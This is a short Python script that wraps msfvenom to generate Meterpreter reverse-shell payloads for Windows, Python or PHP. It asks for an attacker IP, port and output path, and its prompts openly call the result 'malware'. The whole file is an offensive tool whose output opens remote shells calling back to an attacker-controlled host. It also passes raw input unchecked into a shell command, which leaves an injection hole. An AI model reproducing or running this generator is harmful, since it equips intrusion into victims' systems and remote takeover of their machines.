import subprocess as sp 
import os, sys

def rev_shell():
    if not os.getuid() == 0:
        sys.exit('This script must be run as root.')
    u=input("enter the type of the malware you want to generate: \n")
    connection=input("Enter the CONNECTION TYPE for the payload(For Ex: reverse_tcp or reverse_https etc): \n")
    your_ip=input("Enter the ip address: \n")
    port= (input("Enter the port: \n"))
    your_directory=input("enter the path of your directory: [For Ex: /home/darknet/Desktop/MyMalwares/] \n")
    your_file_name=input("Enter your file name: \n")
    if u == 'windows':
        sp.call("msfvenom -p windows/meterpreter/"+connection + " " + "lhost="+your_ip+" "+"lport="+port+" " +"-o"+" "+your_directory+your_file_name ,shell=True)
        print("\n")
    elif u == 'python':
        sp.call("msfvenom -p python/meterpreter/"+connection + " " + "lhost="+your_ip+" "+"lport="+port+" " +"-o"+" "+your_directory+your_file_name ,shell=True)
        print("\n")
    elif u == 'php':
        sp.call("msfvenom -p php/meterpreter/"+connection + " " + "lhost="+your_ip+" "+"lport="+port+" " +"-o"+" "+your_directory+your_file_name ,shell=True)
        print("\n")
        
    else: 
        print("invalid input")



rev_shell()

while True:
    run_again = input("Do you want to run the script again? Answer with yes/no. \n")
    if run_again == 'yes' or run_again == 'y':
        rev_shell()
    else:
        print("Thanks for using. Bye")
        break
        


